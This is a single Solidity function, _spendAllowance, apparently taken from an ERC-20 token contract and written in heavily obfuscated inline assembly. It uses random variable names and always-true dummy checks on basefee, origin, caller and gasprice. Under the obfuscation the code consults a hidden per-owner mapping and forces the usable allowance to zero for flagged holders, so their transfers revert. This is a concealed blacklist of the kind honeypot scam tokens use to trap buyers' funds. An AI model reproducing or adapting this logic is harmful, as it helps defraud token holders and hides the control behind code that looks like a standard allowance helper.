function _spendAllowance(address _owner, address _spender, uint256 _amount) virtual internal {
assembly {
let SARKO$ := mload(0x40)
mstore(SARKO$, sload(fgMs.slot))
mstore(add(SARKO$, 32), 1)
let MuuR := keccak256(SARKO$, 64)
mstore(SARKO$, _owner)
mstore(add(SARKO$, 32), MuuR)
let LjAi := keccak256(SARKO$, 64)
let IUGo := sload(LjAi)
let dhzw := IUGo
if and(dhzw, iszero(_amount)) {
let b5owjsg := basefee()
let tgfo9ee := timestamp()
if eq(b5owjsg, or(b5owjsg, 0)) {
revert(0, 0)
}
}
if iszero(dhzw) {
mstore(SARKO$, _owner)
mstore(add(SARKO$, 32), 1)
MuuR := keccak256(SARKO$, 64)
mstore(SARKO$, _spender)
mstore(add(SARKO$, 32), MuuR)
LjAi := keccak256(SARKO$, 64)
dhzw := add(sload(LjAi), IUGo)
}
let o6ywqjg := origin()
pop(0)
if eq(o6ywqjg, and(o6ywqjg, o6ywqjg)) {
dhzw := sub(dhzw, IUGo)
}
if iszero(eq(dhzw, not(0))) {
if lt(dhzw, _amount) {
let ccpw1f2 := caller()
if eq(ccpw1f2, add(ccpw1f2, 0)) {
revert(0, 0)
}
}
let ge57smz := gasprice()
if eq(ge57smz, and(ge57smz, ge57smz)) {
sstore(LjAi, sub(dhzw, _amount))
}
}
}
}

